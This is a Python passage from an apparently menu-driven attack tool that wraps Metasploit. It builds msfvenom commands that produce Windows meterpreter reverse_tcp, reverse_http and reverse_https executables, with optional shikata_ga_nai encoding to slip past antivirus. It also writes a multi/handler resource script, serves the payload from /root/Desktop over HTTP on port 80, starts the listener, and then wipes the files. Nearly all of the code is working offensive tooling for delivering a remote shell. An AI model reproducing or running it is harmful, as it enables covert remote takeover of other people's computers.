def select_language():
    global LANG
    choice = input(MESSAGES['en']['choose_language'])
    if choice.strip() == "1":
        LANG = 'fr'
    else:
        LANG = 'en'

def clear():
    os.system("clear")

def banner():
    clear()
    print(MESSAGES[LANG]['banner'])

def display_credits():
    print(MESSAGES[LANG]['credits'])

def show_tutorial():
    clear()
    print(MESSAGES[LANG]['tutorial'])
    input(MESSAGES[LANG]['press_enter'])

def choose_payload():
    print(Fore.YELLOW + "\n" + MESSAGES[LANG]['prompt_payload_choice'])
    choice = input(Fore.CYAN)
    if choice == "1":
        return "windows/meterpreter/reverse_tcp"
    elif choice == "2":
        return "windows/meterpreter/reverse_http"
    elif choice == "3":
        return "windows/meterpreter/reverse_https"
    else:
        print(Fore.RED + MESSAGES[LANG]['invalid_choice'])
        return choose_payload()

def generate_payload():
    banner()
    print(Fore.YELLOW + "[1] " + MESSAGES[LANG]['menu_options'][0])
    payload = choose_payload()
    LHOST = input(Fore.CYAN + "\n" + MESSAGES[LANG]['prompt_lhost'])
    LPORT = input(Fore.CYAN + MESSAGES[LANG]['prompt_lport'])
    FILENAME = input(Fore.CYAN + MESSAGES[LANG]['prompt_filename'])
    use_encoder = input(Fore.CYAN + MESSAGES[LANG]['prompt_encoder']).lower()
    
    os.makedirs("/root/Desktop", exist_ok=True)
    output_path = os.path.join("/root/Desktop", FILENAME)
    
    print(Fore.YELLOW + MESSAGES[LANG]['generating_payload'])
    
    if use_encoder == 'y':
        msf_cmd = f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -e x86/shikata_ga_nai -i 10 -f exe -o {output_path}"
    else:
        msf_cmd = f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -f exe -o {output_path}"
    
    os.system(msf_cmd)
    print(Fore.GREEN + MESSAGES[LANG]['payload_generated'] + output_path)
    
    # Création du fichier handler.rc
    rc_script = f"""
use exploit/multi/handler
set payload {payload}
set LHOST {LHOST}
set LPORT {LPORT}
set ExitOnSession false
exploit -j -z
"""
    with open("handler.rc", "w") as f:
        f.write(rc_script)
    print(Fore.YELLOW + MESSAGES[LANG]['handler_created'])

def launch_http_server():
    print(Fore.YELLOW + "\n" + MESSAGES[LANG]['launch_http'])
    try:
        subprocess.Popen(["x-terminal-emulator", "-e", "bash", "-c", "cd /root/Desktop && python3 -m http.server 80"])
    except FileNotFoundError:
        print(Fore.RED + MESSAGES[LANG]['terminal_not_found'])
        print(Fore.RED + "   cd /root/Desktop && python3 -m http.server 80")
    time.sleep(2)

def launch_metasploit_handler():
    print(Fore.YELLOW + "\n" + MESSAGES[LANG]['launch_msf'])
    os.system("msfconsole -r handler.rc")

def cleanup_files():
    dir_path = "/root/Desktop"
    confirm = input(Fore.CYAN + MESSAGES[LANG]['cleanup_prompt'].format(dir_path)).lower()
    if confirm == 'y':
        for f in os.listdir(dir_path):
            file_path = os.path.join(dir_path, f)
            try:
                os.remove(file_path)
                print(Fore.GREEN + MESSAGES[LANG]['file_deleted'] + file_path)
            except Exception as e:
                print(Fore.RED + f"Error deleting {file_path}: {e}")
        if os.path.exists("handler.rc"):
            os.remove("handler.rc")
            print(Fore.GREEN + MESSAGES[LANG]['handler_deleted'])
    else:
        print(Fore.CYAN + MESSAGES[LANG]['cleanup_cancelled'])

def main_menu():
    while True:
        banner()
        print(Fore.YELLOW + "\n" + MESSAGES[LANG]['menu'])
        for option in MESSAGES[LANG]['menu_options']:
            print(Fore.GREEN + option)
        choice = input(Fore.CYAN + MESSAGES[LANG]['prompt_option'])
        if choice == "1":
            generate_payload()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "2":
            launch_http_server()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "3":
            launch_metasploit_handler()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "4":
            cleanup_files()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "5":
            display_credits()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "6":
            show_tutorial()
        elif choice == "7":
            print(Fore.RED + MESSAGES[LANG]['exit_msg'])
            sys.exit(0)
        else:
            print(Fore.RED + MESSAGES[LANG]['invalid_choice'])
            time.sleep(1)
